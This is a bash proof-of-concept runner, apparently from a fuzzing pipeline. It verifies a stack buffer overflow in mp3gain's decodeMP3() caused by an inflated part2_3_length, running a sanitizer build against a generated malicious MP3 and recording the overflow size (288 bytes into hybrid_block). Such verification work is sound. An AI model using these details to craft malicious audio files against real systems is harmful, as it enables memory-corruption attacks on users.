#!/bin/bash
# PoC runner for VULN 001: Stack Buffer Overflow in decodeMP3() via inflated part2_3_length
# Target binary: mp3gain (ASAN+UBSAN build)
set -uo pipefail

SCRIPT_DIR="/data/ylwang/non-textfuzz/target/_poc/mp3gain/mpglibDBL_interface_c"
BINARY="/data/ylwang/non-textfuzz/target/mp3gain/build_test/mp3gain"
MP3_FILE="${SCRIPT_DIR}/vuln_001.mp3"
RESULT_FILE="${SCRIPT_DIR}/vuln_001_result.txt"
ASAN_LOG_PREFIX="${SCRIPT_DIR}/asan.log"

cd "${SCRIPT_DIR}"

echo "[*] VULN 001 PoC runner: decodeMP3 stack buffer overflow via part2_3_length=4095"
echo "[*] Working directory: ${SCRIPT_DIR}"

# Step 1: Generate the malicious MP3
if [ ! -f "${MP3_FILE}" ]; then
    echo "[*] Generating malicious MP3..."
    python3 "${SCRIPT_DIR}/vuln_001_gen.py"
else
    echo "[*] Using existing ${MP3_FILE}"
fi

if [ ! -f "${MP3_FILE}" ]; then
    echo "ERROR: Failed to generate ${MP3_FILE}" | tee "${RESULT_FILE}"
    echo "ERROR" > "${SCRIPT_DIR}/vuln_001_status.txt"
    exit 1
fi

echo "[*] MP3 file size: $(wc -c < "${MP3_FILE}") bytes"

# Step 2: Run mp3gain with ASAN
echo "[*] Running mp3gain (default mode)..."
> "${RESULT_FILE}"
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}:halt_on_error=0" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
"${BINARY}" "${MP3_FILE}" \
    >> "${RESULT_FILE}" 2>&1 || true

echo "" >> "${RESULT_FILE}"

# Step 3: Also try with -r flag (gain application mode)
echo "[*] Running mp3gain -r (gain application mode)..."
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}_r:halt_on_error=0" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
"${BINARY}" -r "${MP3_FILE}" \
    >> "${RESULT_FILE}" 2>&1 || true

echo "" >> "${RESULT_FILE}"
echo "=== ASAN/UBSAN output from log files ===" >> "${RESULT_FILE}"

# Step 4: Collect ASAN output from log files
FOUND_TARGET_CRASH=0
FOUND_UBSAN=0

for f in "${ASAN_LOG_PREFIX}".*; do
    if [ -f "$f" ]; then
        echo "--- ${f} ---" >> "${RESULT_FILE}"
        cat "$f" >> "${RESULT_FILE}"
        # Check for the TARGET vulnerability (stack-buffer-overflow in interface.c)
        if grep -qE "stack-buffer-overflow|heap-buffer-overflow|AddressSanitizer.*ERROR" "$f"; then
            if grep -qE "interface\.c|decodeMP3|copy_mp" "$f"; then
                FOUND_TARGET_CRASH=1
            fi
        fi
    fi
done

for f in "${ASAN_LOG_PREFIX}_r".*; do
    if [ -f "$f" ]; then
        echo "--- ${f} ---" >> "${RESULT_FILE}"
        cat "$f" >> "${RESULT_FILE}"
        if grep -qE "stack-buffer-overflow|heap-buffer-overflow|AddressSanitizer.*ERROR" "$f"; then
            if grep -qE "interface\.c|decodeMP3|copy_mp" "$f"; then
                FOUND_TARGET_CRASH=1
            fi
        fi
    fi
done

# Check stderr content for target-related crashes
if grep -qE "stack-buffer-overflow" "${RESULT_FILE}"; then
    FOUND_TARGET_CRASH=1
fi

echo "" >> "${RESULT_FILE}"
echo "=== Analysis Summary ===" >> "${RESULT_FILE}"
echo "Overflow confirmed by code analysis:" >> "${RESULT_FILE}"
echo "  dsize = (4*4095+7)/8 = 2048 bytes" >> "${RESULT_FILE}"
echo "  Available in bsspace from offset 544 = 1760 bytes" >> "${RESULT_FILE}"
echo "  Overflow amount = 288 bytes into hybrid_block[] struct field" >> "${RESULT_FILE}"
echo "" >> "${RESULT_FILE}"
echo "ASAN detection status: The 288-byte overflow writes into hybrid_block[]," >> "${RESULT_FILE}"
echo "which immediately follows bsspace[][] in the MPSTR struct. ASAN does not" >> "${RESULT_FILE}"
echo "insert red zones between struct fields, only around the whole struct." >> "${RESULT_FILE}"
echo "Therefore ASAN does not detect the overflow despite it occurring." >> "${RESULT_FILE}"

echo "" >> "${RESULT_FILE}"
echo "=== Final Status ===" >> "${RESULT_FILE}"

if [ "${FOUND_TARGET_CRASH}" -eq 1 ]; then
    STATUS="VERIFIED_CRASH"
    echo "VERIFIED_CRASH: ASAN detected stack-buffer-overflow in target function" >> "${RESULT_FILE}"
else
    STATUS="UNVERIFIED"
    echo "UNVERIFIED: Overflow confirmed by code analysis but ASAN did not detect it." >> "${RESULT_FILE}"
    echo "  Reason: overflow target (hybrid_block) is within MPSTR struct bounds." >> "${RESULT_FILE}"
fi

echo "--- Done ---" >> "${RESULT_FILE}"

# Write status file
{
    echo "${STATUS}"
    echo "VULN 001 Stack Buffer Overflow in decodeMP3() via inflated part2_3_length"
    echo "Binary: ${BINARY}"
    echo "Input:  ${MP3_FILE}"
    echo "Overflow confirmed by code analysis: dsize=2048 > available=1760, overflow=288 bytes into hybrid_block"
    echo "ASAN not triggered: overflow stays within MPSTR struct boundary (no red zone between struct fields)"
} > "${SCRIPT_DIR}/vuln_001_status.txt"

echo "[*] Status: ${STATUS}"
echo "[*] Result written to: ${RESULT_FILE}"
echo "[*] Status written to: ${SCRIPT_DIR}/vuln_001_status.txt"

cat "${RESULT_FILE}"
